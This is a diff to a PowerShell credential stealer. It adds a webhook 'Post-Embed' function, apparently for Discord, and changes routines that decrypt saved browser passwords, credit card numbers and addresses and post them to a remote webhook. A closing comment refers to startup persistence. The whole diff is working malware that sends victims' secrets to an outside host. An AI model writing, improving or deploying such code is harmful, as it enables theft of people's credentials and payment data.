@@ -48,6 +48,18 @@ function Post-One($text){
   }catch{ return $false }
 }
 
+function Post-Embed($title, $desc, $color){
+  try{
+    $emb = @{ title=[string]$title; description=[string]$desc; color=[int]$color } | ConvertTo-Json -Compress
+    $body = '{"embeds":[' + $emb + ']}'
+    $wc = New-Object Net.WebClient
+    $wc.Encoding = [Text.Encoding]::UTF8
+    $wc.Headers.Add('Content-Type','application/json')
+    [void]$wc.UploadString($W,'POST',$body)
+    $wc.Dispose()
+  }catch{}
+}
+
 function Upload-File($path){
   try{
     $bn=[Guid]::NewGuid().ToString()
@@ -632,11 +644,12 @@ function Get-Passwords {
     Remove-Item $tmp -Force -EA SilentlyContinue
     foreach ($r in $rows) {
       $pw = Decode-Single $r[2] $key
-      if ($pw) { [void]$hits.Add(($t.n + '|' + $r[0] + '|' + $r[1] + '|' + $pw)) }
+      if ($pw) { [void]$hits.Add($r[1] + ' : ' + $pw) }
     }
   }
-  if ($hits.Count -eq 0) { Post '[passwords] none'; return }
-  Post ("`[passwords] " + $hits.Count + '`' + "`n" + (($hits -join "`n")))
+  if ($hits.Count -eq 0) { Post-Embed 'Saved Passwords' 'No saved credentials found.' 0xFF0000; return }
+  $desc = '```' + (($hits -join "`n")) + '```'
+  Post-Embed ("Saved Passwords ($($hits.Count))") $desc 0xFF0000
 }
 
 function Get-CreditCards {
@@ -658,11 +671,12 @@ function Get-CreditCards {
     Remove-Item $tmp -Force -EA SilentlyContinue
     foreach ($r in $rows) {
       $num = Decode-Single $r[2] $key
-      if ($num) { [void]$hits.Add(($t.n + '|' + $r[0] + '|' + $r[1] + '|' + $num)) }
+      if ($num) { [void]$hits.Add($r[0] + ' | ' + $r[1] + ' | ' + $num) }
     }
   }
-  if ($hits.Count -eq 0) { Post '[creditcards] none'; return }
-  Post ("`[creditcards] " + $hits.Count + '`' + "`n" + (($hits -join "`n")))
+  if ($hits.Count -eq 0) { Post-Embed 'Credit Cards' 'No saved cards found.' 0xFF0000; return }
+  $desc = '```' + (($hits -join "`n")) + '```'
+  Post-Embed ("Credit Cards ($($hits.Count))") $desc 0xFF0000
 }
 
 
@@ -759,7 +773,7 @@ public class AddrGrab {
     }
     Remove-Item $tmp -Force -EA SilentlyContinue
   }
-  if ($hits.Count -eq 0) { Post '[addresses] none'; return }
+  if ($hits.Count -eq 0) { Post-Embed 'Addresses' 'No saved addresses found.' 0xFF0000; return }
   $seen = @{}
   $out = New-Object System.Collections.ArrayList
   foreach ($h in $hits) {
@@ -767,7 +781,8 @@ public class AddrGrab {
     $kl = $key.ToLower()
     if (-not $seen[$kl]) { $seen[$kl] = $true; [void]$out.Add($h) }
   }
-  Post ("`[addresses] " + $out.Count + '`' + "`n" + (($out -join "`n")))
+  $desc = '```' + (($out -join "`n")) + '```'
+  Post-Embed ("Addresses ($($out.Count))") $desc 0xFF0000
 }
 
 # ---- startup: persist + boot notify ----
